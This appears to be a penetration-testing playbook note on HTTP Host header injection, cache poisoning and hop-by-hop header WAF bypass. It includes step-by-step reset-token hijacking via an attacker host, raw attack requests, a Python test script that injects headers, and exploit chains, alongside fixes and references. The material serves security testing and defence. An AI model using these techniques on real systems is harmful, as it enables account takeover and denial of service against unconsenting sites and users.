# Advanced HTTP Header Injection & Proxy Manipulation

**Tags:** #high #header-injection #cache-poisoning #host-header #waf-bypass
**OWASP:** A05:2021-Security Misconfiguration
**CVSS Base:** 7.5 (High)

---

## 📖 What is it

Advanced HTTP Header Injection involves exploiting the way applications and intermediate proxies (NGINX, Cloudflare, Load Balancers) interpret and trust HTTP headers. This can lead to Cache Poisoning, Account Takeover, and WAF bypasses.

---

## 🔍 `grep_search` Tactics

```
req.headers
X-Forwarded-Host
X-Original-URL
X-Rewrite-URL
req.get('Host')
request.host
HTTP_X_FORWARDED_FOR
```

---

## 💣 Attack Category 1: Host Header Injection (Password Reset)

If an application uses the `Host` header to generate absolute links in automated emails (e.g., password resets), an attacker can hijack the reset token.

**Attack:**
1. Request a password reset for `victim@company.com`.
2. Intercept the request and change the header to `Host: attacker-server.com` or add `X-Forwarded-Host: attacker-server.com`.
3. If the app uses this value, the reset link in the victim's email will be `https://attacker-server.com/reset?token=XYZ`.
4. Victim clicks, token is logged by attacker.

---

## 💣 Attack Category 2: HTTP Cache Poisoning via Headers

Exploiting the desynchronization between what the Cache (CDN) thinks is the key and what the Backend thinks is the request.

**Tactic: Unkeyed Header Injection**
If the application reflects an unkeyed header (like `X-Forwarded-Scheme`) in the response (e.g., in a redirect), the attacker can poison the cache.
```http
GET /home HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http

# Response:
HTTP/1.1 301 Moved Permanently
Location: https://target.com/home
# If the cache stores this redirect, all users are forced to HTTPS (or vice versa, or to a different host if combined with Host injection).
```

---

## 💣 Attack Category 3: WAF / ACL Bypass via Hop-by-Hop Headers

Certain headers are "hop-by-hop" and should not be forwarded. Some proxies fail to remove them, or can be tricked into removing security-critical headers.

**Tactic: `Connection` header manipulation**
```http
GET /admin HTTP/1.1
Host: target.com
Connection: close, X-Proxy-User-ID
# Tricking the proxy into removing the X-Proxy-User-ID header which might contain the authenticated user's ID, potentially leading to an "Anonymous" (and thus bypassable) state.
```

---

## 🧪 Validation Script (Host Header)

```python
# .tmp/test_host_injection.py
import requests

TARGET = "http://target.com/password-reset"
EVIL_HOST = "attacker-collector.com"

# Test 1: Direct Host Injection
r1 = requests.post(TARGET, data={"email": "test@test.com"}, headers={"Host": EVIL_HOST})

# Test 2: X-Forwarded-Host Injection
r2 = requests.post(TARGET, data={"email": "test@test.com"}, headers={"X-Forwarded-Host": EVIL_HOST})

print(f"Direct Host Status: {r1.status_code}")
print(f"X-Forwarded Status: {r2.status_code}")
# Check manually if the link received in the test email reflects EVIL_HOST.
```

---

## 🛡️ Fix

1. **Whitelist Allowed Hosts:** Compare the `Host` header against a hardcoded whitelist.
2. **Ignore X-Forwarded-Host:** Do not use it for critical logic unless coming from a strictly trusted proxy.
3. **Use Protocol-Relative URLs:** Avoid generating absolute URLs using user-controlled headers.
4. **Disable Hop-by-Hop Header Forwarding:** Configure the proxy to strictly sanitize headers.

---

## 🔗 Chain Exploits

```
Host Header Injection + Password Reset = Account Takeover
X-Forwarded-Host + Cache Poisoning = Denial of Service for all users
Header Injection + SSRF = Bypassing internal auth mechanisms that trust specific headers
```

---

## 📌 References
- [PortSwigger — Host Header Attacks](https://portswigger.net/web-security/host-header)
- [James Kettle — Practical HTTP Cache Poisoning](https://portswigger.net/research/practical-http-cache-poisoning)
- [[chain-exploit-butterfly-effect]]
